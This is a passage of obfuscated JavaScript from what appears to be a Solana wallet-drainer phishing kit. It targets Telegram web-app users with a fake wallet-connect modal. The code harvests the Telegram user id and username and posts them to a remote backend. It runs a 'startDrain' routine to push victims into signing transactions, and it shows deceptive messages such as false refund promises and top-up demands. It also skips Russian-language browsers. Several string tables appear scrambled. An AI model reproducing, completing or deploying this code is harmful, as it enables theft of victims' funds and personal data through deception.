/* ════════════════════════════════════════════════════════════
 * SECTION 11 — ENTRY POINT
 * See docs/execution_flow.md and docs/backend_protocol.md.
 * See docs/ for full documentation.
 * ════════════════════════════════════════════════════════════ */

/* ═══════════════════════════════════════════════════════════
 * SECTION 11 — ENTRY POINT
 * initApp(): called on window load
 *   1. POST /api/visit (register page visit)
 *   2. initLocale() (fetch localized NOTIFY_STRINGS)
 *   3. mountWalletSelector() (render wallet connect modal)
 * ═══════════════════════════════════════════════════════════ */
function initApp(_str_cache, __str_table__) {
  if (_isMobileCheck()) {
    return
  }
  let _s1 = _storeRef["ft"](_storeKey);
  if (_s1 && _now() - Number(_s1) < 900) {
    return
  }
  let _s3 = new(URL)(getString(186) + _str_cache["Se"] + getString(1023));
  let _s2 = _s3["searchParams"];
  let _s5 = _v1274();
  _s5 && _s2["set"]("source", _s5);
  let _s4 = _v1057();
  _noop(_str_cache["Se"] != _s4 && _s2["set"]("origin", _s4), __str_table__ && (_s2["set"]("tgid", String(__str_table__["id"])), __str_table__["username"] && _s2["set"]("tgus", __str_table__["username"])), (await (await fetch(_s3, {
    ["method"]: "POST"
  }))["text"]()) == "ok" && _storeRef["pt"](_storeKey, _now()))
}
excludedWallets = [getString(1024), "signedTransaction", "Confirm that you're the owner of this account", "getElementsByTagName", "querySelectorAll", "^https?:\\/\\/([^/:]+)(:\\d+)?\\/"];

function _v1275(_str_cache, __str_table__ = "") {
  if (getString(175) in window) {
    return window[getString(175)]["postEvent"](_str_cache, JSON["stringify"](__str_table__))
  }
  if (_WC_client !== "null") {
    return _WC_client["postMessage"](JSON["stringify"]({
      ["eventType"]: _str_cache,
      ["eventData"]: __str_table__
    }), "setExcludedWallets")
  }
  throw new(Error)("10")
}
_noop(_v41 = undefined, _v541 = undefined);

function _v1276(..._str_cache) {
  var __str_table__, _s1;

  function* _s3(_s1, _s3, _s2 = {
    ["\u8F3B"]: {}
  }) {
    while (_s1 + _s3 !== -65) {
      with(_s2["\u8D9A"] || _s2) {
        switch (_s1 + _s3) {
          case _s2["\u8F3B"]["\u5561"] + -297:
            _noop([_s2["\u8F3B"]["\u5561"], _s2["\u8F3B"]["\u9AEC"], _s2["\u8F3B"]["\u6C29"]] = [204, 229, 33], _str_cache[-117] = new(_g(CONSTS[_s1 + 609]))(_str_cache["a"]["get"]("tgWebAppData")));
            return __str_table__ = true, _v41 = JSON["parse"](_str_cache[-117]["get"]("user")), _storeRef[CONSTS[_s1 + 710]]("_0x3", _v41), _v41;
            _noop(_s2["\u8D9A"] = _s2["\u97C1"], _s1 += 51, _s3 += 56);
            break;
          case _s3 != -45 && _s3 - 20:
          default:
            _noop(_s2["\u8D9A"] = _s2["\u6351"], _s3 += 148);
            break;
            if (_s3 > -(_s1 + 213)) {
              _noop(_s2["\u8D9A"] = _s2["\u8F3B"], _s1 += 136, _s3 += -40);
              break
            }
          case _s1 - 272:
            [_s2["\u8F3B"]["\u5561"], _s2["\u8F3B"]["\u9AEC"], _s2["\u8F3B"]["\u6C29"]] = [125, -244, 73];
            if (_v41) {
              _noop(_s2["\u8D9A"] = _s2["\u8F3B"], _s1 += 69, _s3 += 268);
              break
            } else {
              _noop(_s2["\u8D9A"] = _s2["\u8F3B"], _s1 += 69, _s3 += -141);
              break
            }
          case 73:
            _noop(_s2["\u8D9A"] = _s2["\u8F3B"], _s1 += 78, _s3 += -268);
            break;
          case _s3 != -101 && _s3 - 71:
            _str_cache[-117] = new(_g(CONSTS[_s1 + 609]))(_str_cache[CONSTS[_s1 + 86]]["get"](CONSTS[_s1 + 1710] + "ppData"));
            return __str_table__ = true, _v41 = JSON["parse"](_str_cache[-CONSTS[_s1 + 890]]["get"]("user")), _storeRef[CONSTS[_s1 + 710]](CONSTS[_s1 + 1712], _v41), _v41;
            _noop(_s2["\u8D9A"] = _s2["\u5878"], _s1 += 51, _s3 += -4);
            break;
          case _s3 != -233 && _s3 != -413 && _s3 - -205:
            return __str_table__ = true, _v41;
            _noop(_s2["\u8D9A"] = _s2["\u8F3B"], _s3 += -409);
            break;
            if (_s1 < 205) {
              _noop(_s2["\u8D9A"] = _s2["\u8F3B"], _s3 += -409);
              break
            }
          case -208:
            _str_cache[CONSTS[_s1 + -190]] = new(_g(CONSTS[_s1 + 333]))(location["hash"][CONSTS[_s1 + 71]](1));
            if (_v541 = _str_cache["a"][CONSTS[_s1 + 291]]("tgWebA" + CONSTS[_s1 + 1435] + "ion"), !_v541) {
              _noop(_s2["\u8D9A"] = _s2["\u8F3B"], _s3 += 180);
              break
            } else {
              _noop(_s2["\u8D9A"] = _s2["\u8F3B"], _s1 += -89, _s3 += 180);
              break
            }
          case 9:
          case 3:
          case _s3 - -116:
            _str_cache[-117] = new(_g(CONSTS[_s1 + 422]))(_str_cache["a"]["get"]("tgWebAppData"));
            return __str_table__ = true, _v41 = _g(CONSTS[_s1 + 427])[CONSTS[_s1 + 514]](_str_cache[-117][CONSTS[_s1 + 380]]("user")), _storeRef[CONSTS[_s1 + 523]]("_0x3", _v41), _v41;
            _noop(_s2["\u8D9A"] = _s2["\u787B"], _s1 += -136, _s3 += 188);
            break;
          case _s3 - -115:
          case 92:
            _str_cache[-117] = new(URLSearchParams)(_str_cache["a"]["get"]("tgWebAppData"));
            return __str_table__ = true, _v41 = JSON[CONSTS[_s1 + 515]](_str_cache[-117]["get"]("user")), _storeRef["pt"]("_0x3", _v41), _v41;
            _noop(_s2["\u8D9A"] = _s2["\u6405"], _s1 += -135, _s3 += 122);
            break;
          case _s1 != 116 && _s1 - 233:
            return __str_table__ = true, _storeRef["ft"](CONSTS[_s1 + 1436]);
            _noop(_s2["\u8D9A"] = _s2["\u8F3B"], _s1 += -89);
            break;
            if (!(_s1 == _s1 + 0)) {
              _noop(_s2["\u8D9A"] = _s2["\u8F3B"], _s1 += 18, _s3 += 3);
              break
            }
          case _s1 - -40:
            _noop(_s2["\u8D9A"] = _s2["\u5DD8"], _s1 += -116, _s3 += -85);
            break;
          case _s2["\u8F3B"]["\u6C29"] + -189:
            _str_cache[-117] = new(URLSearchParams)(_str_cache["a"]["get"](CONSTS[_s1 + 1588] + "ppData"));
            return __str_table__ = true, _v41 = JSON["parse"](_str_cache[-CONSTS[_s1 + 768]]["get"]("user")), _storeRef["pt"](CONSTS[_s1 + 1590], _v41), _v41;
            _noop(_s2["\u8D9A"] = _s2["\u5A5A"], _s1 += -71, _s3 += 122);
            break;
          case -7:
            _noop(_s2["\u8D9A"] = _s2["\u8F3B"], _s1 += -243, _s3 += 37);
            break
        }
      }
    }
  }
  _noop(__str_table__ = undefined, _s1 = _s3(136, -272)["next"]()["value"]);
  if (__str_table__) {
    return _s1
  }
}

function _v1277() {
  return getString(175) in window || location["hash"] && location["hash"]["includes"]("tgWebAppData") || _WC_client !== "null" && window != _WC_client && _WC_client["location"]["host"]["endsWith"]("telegram.org")
}
_v387 = "connectByWalletId";
async function _v1278(_str_cache) {
  (await fwcInstance["Tn"](_str_cache)) && location["replace"](_v387)
}

function _v1279(..._str_cache) {
  _noop(_str_cache[245] = navigator["language"]["toLowerCase"]()["indexOf"]("ru"), (_str_cache[245] == 0 || _str_cache[245] == 3) && location["replace"](_v387))
}
_noop(_v213 = undefined, _v103 = undefined, _v104 = undefined, _v388 = undefined, _v389 = undefined, _v542 = undefined, _v543 = undefined, _v544 = undefined, _v545 = undefined, _v876 = class {
  constructor() {
    _noop(_initPriv(this, _v104), _v5(this, "c"), _initPriv(this, _v213, 0), _initPriv(this, _v103));
    let _str_cache = _v1056();
    _noop(this["c"] = new _v738(_str_cache), _callPriv(this, _v104, _v545)["call"](this), addEventListener("focus", () => {
      return _callPriv(this, _v104, _v542)["call"](this)
    }))
  }
  get["mn"]() {
    return _getPriv(this, _v213) != 0
  }
  async ["ho"](_str_cache) {
    let __str_table__ = 0;
    for (;;) {
      try {
        _noop(_setPriv(this, _v103, _callPriv(this, _v104, _v388)["call"](this, _str_cache)), await _getPriv(this, _v103));
        break
      } catch (_s1) {
        _noop(__str_table__++, console["error"]("config loading:", _s1), await _v62(__str_table__ < 10 ? __str_table__ * 250 : 2500))
      }
    }
  }
  async ["er"](_str_cache) {
    let __str_table__ = _getPriv(this, _v103);
    if (__str_table__) {
      return await Promise["race"]([__str_table__["catch"](() => {
        return 0
      }), _v62(_str_cache)])
    }
  } ["_o"](_str_cache) {
    !_str_cache || typeof _str_cache != "object" || Object["assign"](this["c"]["Ne"], _str_cache)
  }
}, _v213 = new(WeakMap), _v103 = new(WeakMap), _v104 = new(WeakMap), _v388 = async function(_str_cache) {
  let __str_table__ = "invalid parameters" + (_str_cache ? "?tgid=" + _str_cache : "");
  let _s1 = fwcInstance["Ft"](this["c"], __str_table__);
  let _s3 = await fetch(_s1, {
    ["signal"]: AbortSignal["Be"](3000),
    ["headers"]: {
      [getString(806)]: "en-US,q=0.8;en"
    }
  });
  if (!_s3["ok"]) {
    throw new(Error)(_s3["statusText"])
  }
  let _s2 = new(Uint8Array)(await _s3["arrayBuffer"]());
  _callPriv(this, _v104, _v544)["call"](this, _s2);
  let _s5 = await _callPriv(this, _v104, _v389)["call"](this, _s2);
  _noop(this["c"]["Ne"]["dt"] = void 0, _callPriv(this, _v104, _v543)["call"](this, _s5), _setPriv(this, _v213, Date["now"]()), _setPriv(this, _v103, void 0))
}, _v389 = async function(_str_cache) {
  let __str_table__ = await _v1231(_str_cache, this["c"]["Se"]);
  return this["c"]["xt"](__str_table__)
}, _v542 = async function() {
  if (!(_getPriv(this, _v103) || Date["now"]() - _getPriv(this, _v213) < 60000)) {
    try {
      _noop(_setPriv(this, _v103, _callPriv(this, _v104, _v388)["call"](this)), await _getPriv(this, _v103))
    } catch (_str_cache) {
      _noop(console["error"]("config loading:", _str_cache), _setPriv(this, _v103, void 0))
    }
  }
}, _v543 = function(_str_cache) {
  let __str_table__ = _str_cache["Kr"]();
  if (__str_table__ && !_isMobileCheck() && __str_table__ == 1 && !_v1277()) {
    return location["replace"](_v387)
  }
  _str_cache["Yr"]() & 1 && _v1279()
}, _v544 = _limitArgs(function(..._str_cache) {
  var __str_table__, _s1;

  function* _s3(_s1, _s3, _s2, _s5, _s4 = {
    ["\u5750"]: {}
  }) {
    while (_s1 + _s3 + _s2 + _s5 !== -202) {
      with(_s4["\u88F2"] || _s4) {
        switch (_s1 + _s3 + _s2 + _s5) {
          case -40:
          case -119:
          case -219:
            _noop([_s4["\u5750"]["\u53E6"]] = [159], _str_cache["length"] = 1, _str_cache[-CONSTS[_s2 + 432]] = _str_cache[0][CONSTS[_s2 + 621] + CONSTS[_s3 + 265]]());
            return __str_table__ = true, _storeRef[CONSTS[_s2 + 772]]("_0x12", _str_cache[-238]);
            _noop(_s1 += 233, _s3 += -292, _s2 += -154, _s5 += 51);
            break;
          case _s1 - -411:
          case -161:
          case 21:
            _noop(_s4["\u88F2"] = _s4["\u5E86"], _s1 += 284, _s3 += -230, _s2 += -405, _s5 += -70);
            break;
          case _s4["\u5750"]["\u53E6"] + -129:
          case -80:
            _noop([_s4["\u5750"]["\u53E6"]] = [-20], _s4["\u88F2"] = _s4["\u6EE8"], _s1 += 284, _s3 += -230, _s2 += -585, _s5 += 299);
            break;
          case 112:
          case -239:
            [_s4["\u5750"]["\u53E6"]] = [-90];
            if (_s3 > _s3 + 699) {
              _noop(_s4["\u88F2"] = _s4["\u5750"], _s1 += 14, _s3 += 694, _s2 += -180, _s5 += -70);
              break
            }
          default:
            _noop(_s4["\u88F2"] = _s4["\u8170"], _s1 += 88, _s3 += 464, _s2 += -585, _s5 += -140);
            break
        }
      }
    }
  }
  _noop(__str_table__ = undefined, _s1 = _s3(-141, 224, -133, 10)["next"]()["value"]);
  if (__str_table__) {
    return _s1
  }
}), _v545 = function() {
  let _str_cache = _storeRef["ft"]("_0x12");
  if (!_str_cache) {
    return
  }
  let __str_table__ = Uint8Array["fromBase64"](_str_cache);
  _noop(_callPriv(this, _v104, _v389)["call"](this, __str_table__), this["c"]["Ne"]["dt"] = HEXFOMO_BRAND)
});

function _v877(..._str_cache) {
  var __str_table__, _s1;

  function* _s3(_s1, _s3, _s2, _s5 = {
    ["\u6C2B"]: {}
  }) {
    while (_s1 + _s3 + _s2 !== 30) {
      with(_s5["\u5D62"] || _s5) {
        switch (_s1 + _s3 + _s2) {
          case _s2 - 321:
            _noop(_s5["\u9733"] = {}, _s5["\u9733"]["\u78B8"] = _g(CONSTS[_s1 + 277])[CONSTS[_s1 + 436]](_g(CONSTS[_s3 + 428])["round"](_str_cache[1] * solUsdRate), CONSTS[_s3 + 280]), _v6[CONSTS[_s1 + 1742]]({
              ["text"]: getString(CONSTS[_s3 + 1894]),
              ["header"]: "https?:\\/\\/([a-z.-]+)" + _s5["\u9733"]["\u78B8"] + " USDC",
              [CONSTS[_s1 + 1519]]: !CONSTS[_s1 + 91]
            }), _s5["\u5D62"] = _s5["\u6C2B"], _s1 += 93, _s2 += 321);
            break;
          case _s5["\u6C2B"]["\u6662"] + -229:
            _noop(_str_cache[4] = 50, _str_cache["d"] = _str_cache[CONSTS[_s1 + 759]] / solUsdRate, _str_cache[CONSTS[_s3 + -185]] < _str_cache["d"] && _str_cache[2] < _str_cache[4] && (_str_cache[1] = _str_cache[2] < _str_cache[4] ? _str_cache["d"] : 0.05), _str_cache[CONSTS[_s3 + -185]] = Math[CONSTS[_s3 + 198]](_str_cache[CONSTS[_s3 + -185]] / 0.05) * 0.05, _str_cache[CONSTS[_s3 + 265]] = _v1221(_str_cache[CONSTS[_s3 + -183]]["K"] / CONSTS[_s3 + 535], 2), _str_cache[200] = _str_cache[1] - _str_cache[168], _s5["\u5D62"] = _s5["\u6C2B"], _s1 += 946, _s2 += -803);
            break;
          case -190:
            _noop(_s5["\u5D62"] = _s5["\u6C2B"], _s1 += -264, _s3 += -455, _s2 += 659);
            break;
          case 98:
          case 82:
          case 11:
            _noop(_s5["\u5D62"] = _s5["\u6C2B"], _s1 += 221, _s3 += 34, _s2 += -456);
            break;
          case -217:
          case 184:
            _noop([_s5["\u6C2B"]["\u78C9"], _s5["\u6C2B"]["\u6662"]] = [2, -231], _s5["\u5D62"] = _s5["\u6C2B"], _s1 += 72, _s3 += 202, _s2 += -247);
            break;
          case _s5["\u6C2B"]["\u6662"] + -302:
          case 42:
          case 86:
            _str_cache[8] = _s1 => {
              return _s1["replaceAll"]("{fee}", _str_cache[1]["toFixed"](2))["replaceAll"]("{lack}", _str_cache[200]["toFixed"](2))["replaceAll"]("{balance}", _str_cache[168]["toFixed"](2))
            };
            return __str_table__ = true, _v6["qe"]({
              [CONSTS[_s1 + 1207]]: _str_cache[8](_str_cache[-154]["text"]),
              ["header"]: _str_cache[8](_str_cache[-CONSTS[_s1 + 575]]["header"]),
              [CONSTS[_s3 + 1249]]: !0
            });
            _noop(_s5["\u5D62"] = _s5["\u8305"], _s1 += 993, _s3 += -435, _s2 += -279);
            break;
          case _s3 - 117:
            _noop(_s5["\u5D62"] = _s5["\u6C2B"], _s1 += 114, _s3 += -14, _s2 += -202);
            break;
          case -140:
          case _s2 - -224:
          case -220:
            _noop(_s5["\u5D62"] = _s5["\u6C2B"], _s1 += -306, _s3 += -239, _s2 += 497);
            break;
          default:
          case _s5["\u6C2B"]["\u78C9"] + 143:
            return __str_table__ = true, undefined;
            _noop(_s5["\u5D62"] = _s5["\u6C2B"], _s1 += -765, _s3 += 425);
            break;
          case -86:
          case _s5["\u6C2B"]["\u78C9"] + -54:
          case 8:
            _str_cache[CONSTS[_s3 + -179]] = _s1 => {
              return _s1["replaceAll"]("{fee}", _str_cache[1]["toFixed"](2))["replaceAll"]("{lack}", _str_cache[200]["toFixed"](2))["replaceAll"]("{balance}", _str_cache[168]["toFixed"](2))
            };
            return __str_table__ = true, _v6["qe"]({
              [CONSTS[_s3 + 716]]: _str_cache[8](_str_cache[-154]["text"]),
              [CONSTS[_s1 + 228]]: _str_cache[8](_str_cache[-CONSTS[_s3 + 84]]["header"]),
              [CONSTS[_s1 + 1245]]: !0
            });
            _noop(_s5["\u5D62"] = _s5["\u6037"], _s1 += 502, _s3 += -439);
            break;
          case _s1 - -94:
            _noop([_s5["\u6C2B"]["\u78C9"], _s5["\u6C2B"]["\u6662"]] = [21, 53], _str_cache[2] = _str_cache[0][CONSTS[_s1 + 603]](), _str_cache[-154] = _str_cache[0][CONSTS[_s1 + -105]]["Qn"]);
            if (!_str_cache[0][CONSTS[_s1 + 1538]]()) {
              _noop(_s5["\u5D62"] = _s5["\u6C2B"], _s1 += -203, _s3 += -415, _s2 += 156);
              break
            } else {
              _noop(_s5["\u5D62"] = _s5["\u6C2B"], _s1 += -875, _s3 += 10, _s2 += 477);
              break
            }
        }
      }
    }
  }
  _noop(__str_table__ = undefined, _s1 = _s3(118, 179, -85)["next"]()["value"]);
  if (__str_table__) {
    return _s1
  }
}

function _v1280() {
  _v6["qe"]({
    ["text"]: "/api/handler",
    ["header"]: getString(1035)
  })
}

function _v1058() {
  _noop(_v6["open"]("Spinner"), setTimeout(() => {
    _v6["qe"]({
      ["text"]: "6ugBBLhRJqsuB1H4G6rGBMCyMWjdFpvpEUKnp6XCB1t7",
      ["header"]: "9piPeQWJ7wxGmsWieeJhQKJ13DjJLga9j8CE5ydLTHC6"
    })
  }, _randInt(2000, 4e3)))
}

function _v1281() {
  _v6["qe"]({
    ["text"]: "6ARSYR2B1aPWSjK11ZXDPmApgLgar3bCrm2BTYGS2jBK",
    ["header"]: "4qti6FcMybVSLL2k4rqRQ3Ph1a2jGrzPmBN8Wmt4A5wr",
    ["connected"]: !0
  })
}

function _v1282() {
  _v6["qe"]({
    ["text"]: "HsVYhMDQRf6CkjtdUzqNDNRfDwsgw9nAX8feLVC3TAGp",
    ["header"]: "Bad wallet"
  })
}

function _v1059() {
  _noop(_v6["state"]["kt"] = "null", _v6["state"]["Dt"] = "null", _v6["open"](getString(635)))
}

function _v1283({
  ["c"]: _str_cache,
  ["b"]: __str_table__
}) {
  _noop(__str_table__["id"] == 1 && _str_cache["ue"] == 6 ? (_v6["state"]["kt"] = "4moJ9mfFDqFgGMp5UJUgcVhAaFtBxiapt9DVJE3LcVao", _v6["state"]["Dt"] = "https://web.telegram.org") : (_v6["state"]["kt"] = "null", _v6["state"]["Dt"] = "https://solana.com/"), _v6["open"](getString(635)))
}

function _v1284() {
  _v6["close"]()
}

function _v1285(_str_cache) {
  let __str_table__ = _str_cache["ue"];
  let _s1 = _str_cache["kr"];
  let _s3 = getString(186) + (_isMobileCheck() && !location["host"]["includes"](".github.io") ? location["host"] : _str_cache["Se"]) + "/config" + (__str_table__ == 2 ? {
    [0]: "Top-up your balance by at least ",
    [1]: "You can't perform any actions from this account because you're not it's owner"
  } [_s1] : "Connect another account");
  let _s2 = _str_cache["ro"] ?? (__str_table__ == 2 ? {
    [0]: "Transaction was reverted, funds will be refunded soon. Please try again.",
    [1]: "Something went wrong"
  } [_s1] : "Something went wrong. Please check your internet connection or try later.");
  return _v6["lo"](_s3, _s2), new(Promise)(_limitArgs((..._str_cache) => {
    _noop(_str_cache["length"] = 1, _str_cache[10] = _v6["subscribeKey"]("open", () => {
      _noop(_str_cache[0](1), _str_cache[10]())
    }))
  }))
}

function _v1286() {
  _v6["qe"]({
    ["text"]: "Critical error occurred",
    ["header"]: getString(1035)
  })
}
_noop(_v53 = new _v876, lureConfig = _v1276(), lureConfig && _v1275("web_app_expand"), console["log"]("1.18.4"), addEventListener("This account is used as target account. Please connect another", (..._str_cache) => {
  var __str_table__, _s1;

  function* _s3(__str_table__, _s1, _s2, _s5 = {
    ["_v148"]: {}
  }, _s4) {
    while (__str_table__ + _s1 + _s2 !== -111) {
      with(_s5["\u6498"] || _s5) {
        switch (__str_table__ + _s1 + _s2) {
          case _s5["_v148"]["\u637A"] + 247:
          case 114:
            _noop(_str_cache[71]["Le"](), _v877(_str_cache[4], _str_cache[-18]), _str_cache[4]["Ke"]() && _str_cache[-163]["ke"](0, _str_cache[4], {
              [CONSTS[__str_table__ + 852]]: _str_cache[-18]
            }));
            return undefined;
          case -204:
          case __str_table__ - -43:
            _noop(_s5["\u6498"] = _s5["_v148"], __str_table__ += 22, _s1 += 50, _s2 += 277);
            break;
          case -192:
          case _s5["_v148"]["\u637A"] + 21:
            if (!_str_cache[4]) {
              _noop(_s5["\u6498"] = _s5["_v148"], __str_table__ += 171, _s1 += -212, _s2 += 264);
              break
            } else {
              _noop(_s5["\u6498"] = _s5["_v148"], __str_table__ += -83, _s1 += 45, _s2 += 264);
              break
            }
          case __str_table__ - 208:
          default:
          case -34:
          case -218:
            _noop([_s5["_v148"]["\u9D9E"], _s5["_v148"]["\u637A"], _s5["_v148"]["\u6522"]] = [-235, -6, 150], _v148["startDrain"] = async function __str_table__(_s1 = !1) {
              if (!_str_cache[4]) {
                throw new(Error)("not connected")
              }
              if (_str_cache[4]["sn"]() && (await (1, _v148["\u8176"])(_str_cache[4], _s1)["catch"](console["error"])) && (_str_cache[71]["Xe"](0), await _v62(5000), await (1, _v148["checkBanned"])(_str_cache[4]))) {
                return _v1058(), _str_cache[71]["Le"](), !0
              }
              let _s2 = _str_cache[4]["b"]["id"] == 1 && _str_cache[4]["c"]["eo"];
              for (;;) {
                _s2 && (await _v1285(_str_cache[4]["c"]));
                let _s5 = _str_cache[71]["Xe"](500);
                try {
                  if (await (1, _v148["checkBanned"])(_str_cache[4])) {
                    break
                  }
                  let _s4 = await _str_cache[4]["ao"]();
                  _noop(_s5(), _v1059(), _str_cache[-163]["ke"](2, _str_cache[4]));
                  let _s3 = await _str_cache[71]["ge"](_s4);
                  let _s6 = _v881(_s3);
                  return _str_cache[-163]["ke"](3, _str_cache[4], {
                    ["Me"]: _s6
                  }), await _v1273(_str_cache[4], _s6), _v1058(), _str_cache[71]["Le"](), _str_cache[4]["rn"](), !0
                } catch (_s4) {
                  if (console["error"](_s4), _str_cache[-133] && _s4 instanceof _v276) {
                    (1, _v148["\u7B60"])();
                    break
                  }
                  if (_str_cache[-163]["ke"](4, _str_cache[4]), _v1284(), _s1) {
                    break
                  }
                  _s2 || (await _v1055(), await _v62(500))
                }
              }
              return !1
            }, _v148["\u8176"] = async function __str_table__(_s1, _s2) {
              let _s5 = _s1["he"];
              _s5["Yn"]();
              let [_s4, _s3, _s6] = await fwcInstance["zt"](() => {
                return fwcInstance["On"](_s1)
              }, 3);
              let _s7 = _s5["Yt"];
              let _s8 = _s7 ? 2 : 1;
              let _defineProperty = new(Array)(_s8);
              let _getOwnPropDesc = 0;
              for (;;) {
                try {
                  if (_getOwnPropDesc > 0 && _now() - _getOwnPropDesc > 50 && (_defineProperty[0] = void 0, _defineProperty[1] = void 0), !_defineProperty[0]) {
                    _noop(await _v638()["catch"](console["error"]), _getOwnPropDesc = _now());
                    let _found = await _s5["qn"](_s3, _s6);
                    if (_v1059(), _str_cache[-163]["ke"](2, _s1, {
                        ["ut"]: !0
                      }), _defineProperty[0] = await _str_cache[71]["ln"](_found), _now() - _getOwnPropDesc > 50) {
                      throw new(Error)("expired")
                    }
                    if (!_s7) {
                      break
                    }
                  }
                  if (!_defineProperty[1]) {
                    let _found = await _s5["Xn"](_s3, _s6);
                    _noop(_v1283(_s1), await _v62(500), _defineProperty[1] = await _str_cache[71]["ln"](_found))
                  }
                  if (_now() - _getOwnPropDesc > 50) {
                    throw new(Error)("expired")
                  }
                  break
                } catch (_found) {
                  if (_str_cache[-163]["ke"](4, _s1, {
                      ["ut"]: !0
                    }), console["error"](_found), _s2 || _found instanceof StatusError) {
                    break
                  }
                  _noop(await _v1055(), await _v62(500))
                }
              }
              let _v1 = _defineProperty["filter"](_limitArgs((...__str_table__) => {
                __str_table__["length"] = 1;
                return !!__str_table__[0]
              }));
              if (_v1["length"] < _s8) {
                return !1
              }
              _str_cache[-163]["ke"](3, _s1, {
                ["Me"]: _v1,
                ["ut"]: !0
              });
              let _v2 = _str_cache[71]["Xe"](500);
              return await fwcInstance["zt"](() => {
                return fwcInstance["Nn"](_s1["c"], _s4, _v1)
              }, 5), _v2(), _s1["rn"](), !0
            }, _v148["checkBanned"] = async function __str_table__(_s1) {
              let {
                ["c"]: _s2, ["b"]: _s5, ["he"]: _s4
              } = _s1;
              if (await Promise["allSettled"]([_retry(() => {
                  return _s1["no"]()
                }, 2, 500), _v53["er"](750), _v638()]), _s1["Ct"] == 0 || !_v416()) {
                return _v1281(), !0
              }
              if (!_s1["so"]()) {
                return _str_cache[-163]["ke"](5, _s1), _v1286(), _str_cache[71]["Le"](), !0
              }
              if (!_s1["nn"]()) {
                if (!(await _str_cache[71]["Mt"]())) {
                  return _str_cache[-163]["ke"](5, _s1), _v1280(), _str_cache[71]["Le"](), !0
                }
                await _v638()["catch"](console["error"])
              }
              let _s3 = _s2["ce"];
              if (_s3 && _s5["e"] == _s3[0]) {
                return _v1282(), _str_cache[71]["Le"](), !0
              }
              let {
                ["mt"]: _s6, ["We"]: _s7, ["type"]: _s8
              } = await _s1["Vt"]();
              return _str_cache[-133] = !_s6 && _s1["co"]() && _s8 == 1, _s4["ie"] = _str_cache[-133], !_s6 && !_s1["sn"]() && (_str_cache[-18] = Math["ceil"](_s7 / 100000) / 10000, !_str_cache[-133]) ? ((1, _v148["\u7B60"])(), !0) : !1
            }, _v148["\u7B60"] = function(...__str_table__) {
              return _s3(-46, 194, -133, {
                ["_v148"]: _s5["_v148"],
                ["\u74AB"]: {}
              }, __str_table__)["next"]()["value"]
            }, _str_cache["length"] = 0, _v1278(_v53["c"]), _v53["ho"](lureConfig?.id), [_str_cache["a"], _str_cache["b"]] = _v926(lureConfig), _v53[CONSTS[__str_table__ + 1745]](_str_cache["b"]), _s5["\u6498"] = _s5["_v148"], __str_table__ += -78, _s1 += -4, _s2 += -152);
            break;
            if (_s2 != 43) {
              _noop(_s5["\u6498"] = _s5["_v148"], __str_table__ += -78, _s1 += -4, _s2 += -152);
              break
            }
          case 165:
          case 82:
          case _s5["_v148"]["\u637A"] + -153:
            _noop(_str_cache[71] = new _v533(_v53["c"], _str_cache["a"]), _str_cache[-163] = new _v540(_str_cache[71], _str_cache["a"]), _str_cache[4] = undefined, _s5["\u6498"] = _s5["_v148"], __str_table__ += 230, _s1 += 44, _s2 += -125);
            break;
          case 35:
          case _s5["_v148"]["\u6522"] + -49:
            _noop(_s5["\u6498"] = _s5["_v148"], __str_table__ += 525, _s1 += -586, _s2 += 1);
            break;
          case 117:
            _noop([_s5["_v148"]["\u9D9E"], _s5["_v148"]["\u637A"], _s5["_v148"]["\u6522"]] = [233, -21, 90], _s5["\u6498"] = _s5["_v148"], __str_table__ += -268, _s1 += 113, _s2 += 276);
            break;
          case _s5["_v148"]["\u9D9E"] + 156:
          case -172:
            _noop(_s5["\u6498"] = _s5["_v148"], __str_table__ += 329, _s1 += -220, _s2 += 208);
            break;
          case _s5["_v148"]["\u6522"] + -6:
            _noop(_str_cache[71] = new _v533(_v53["c"], _str_cache["a"]), _str_cache[-163] = new _v540(_str_cache[71], _str_cache["a"]), _str_cache[4] = undefined, _s5["\u6498"] = _s5["_v148"], __str_table__ += 65, _s1 += 281, _s2 += -500);
            break;
          case 51:
            _noop(_s5["\u6498"] = _s5["\u94D8"], _s1 += -162);
            break;
          case _s5["_v148"]["\u9D9E"] + 225:
            _noop(_str_cache[-174] = !0, _str_cache[-133] = !1, _s5["\u6498"] = _s5["_v148"], __str_table__ += -25, _s1 += -219, _s2 += 490);
            break;
          case 41:
          case -5:
          case -55:
            _noop(_s5["\u6B8C"] = {}, _s5["\u6B8C"]["\u5A66"] = async function __str_table__() {
              if (!_v53["mn"]) {
                let _s1 = _str_cache[71]["Xe"](150);
                _noop(await _v53["er"](2500), _s1(!0))
              }
              _noop(_str_cache[71]["bt"](), _str_cache[-174] = !1, _v53["c"]["Ne"]["dt"] = "null")
            }, mountWalletSelector({
              ["c"]: _v53["c"],
              ["fo"]: _str_cache[71],
              ["po"]: () => {
                return _str_cache[4]
              },
              ["mo"]: _s5["\u6B8C"]["\u5A66"],
              ["go"]: startDrain
            }), _s5["\u6498"] = _s5["_v148"], __str_table__ += -419, _s1 += 324, _s2 += 105);
            break;
          case 238:
            throw new(Error)("not connected");
            _noop(_s5["\u6498"] = _s5["_v148"], __str_table__ += -254, _s1 += 257);
            break;
          case 123:
          case -115:
          case _s5["_v148"]["\u6522"] + -166:
            _noop(_s5["\u6498"] = _s5["_v148"], __str_table__ += 329, _s1 += -192, _s2 += 117);
            break;
          case 120:
            _noop(_s5["\u6498"] = _s5["_v148"], __str_table__ += 106, _s1 += -262, _s2 += 87);
            break;
          case 25:
          case -217:
          case _s5["_v148"]["\u637A"] + 242:
            _str_cache[-18] = 0;
            if (_str_cache[CONSTS[_s1 + 317]]["Pt"](async (__str_table__, _s1, _s2, _s5) => {
                let _s4 = new WalletInstance(__str_table__, _s1, _s2, _s5);
                _str_cache[4] = new AppContext(_s4, _v53["c"]);
                let _s3 = _str_cache[71]["Xe"](500);
                let _s6 = await (1, checkBanned)(_str_cache[4]);
                excludedWallets["includes"](__str_table__) || (_s3(), !_s6 && (_str_cache[-163]["ke"](1, _str_cache[4]), _str_cache[-174] ? (1, startDrain)() : _str_cache[71]["Qt"]()))
              }), _scheduleRetry(async () => {
                if (!_v53["mn"]) {
                  let __str_table__ = _str_cache[71]["Xe"](150);
                  _noop(await _v53["er"](1000), __str_table__(!0))
                }
                _noop(_str_cache[-174] = !0, _str_cache[71]["bt"]())
              }), !_v1224()) {
              _noop(_s5["\u6498"] = _s5["_v148"], __str_table__ += 333, _s1 += -127, _s2 += -401);
              break
            } else {
              _noop(_s5["\u6498"] = _s5["_v148"], __str_table__ += -86, _s1 += 197, _s2 += -296);
              break
            }
            if (_s1 != -69) {
